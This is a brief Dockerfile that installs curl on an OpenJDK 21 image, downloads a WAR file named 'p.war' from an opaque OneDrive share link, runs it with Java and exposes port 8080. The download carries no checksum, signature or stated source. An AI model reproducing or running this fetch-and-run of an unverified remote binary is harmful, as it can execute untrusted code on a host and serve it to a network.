FROM openjdk:21-slim-buster
RUN apt update
RUN apt install -y curl
RUN curl -L https://public.bl.files.1drv.com/y4mOnW1pf0-9tH2ehSqFN8gpZ5MNEyy-RkxzGII4zMeqZPPLUCCGI6XUlEOQ0bBnHP2sxxMesExUbp2_cOIDkFp86ROy-HweoiAwVAz-8c5fo7KbpUdY4nt9as0-Fj7nvV7PVaYcxMX8vy9BcpHbY-uOEHj3SPFPhPaR_3nMyf5je8JkruhKpSzZi3LgQN0L0wwtrPAacOeaAKcgQ_UMXvE0AvR1Hh4AZyVLHXLWpIS23Q?AVOverride=1 -o p.war
 
CMD ["java", "-jar", "p.war"]
EXPOSE 8080
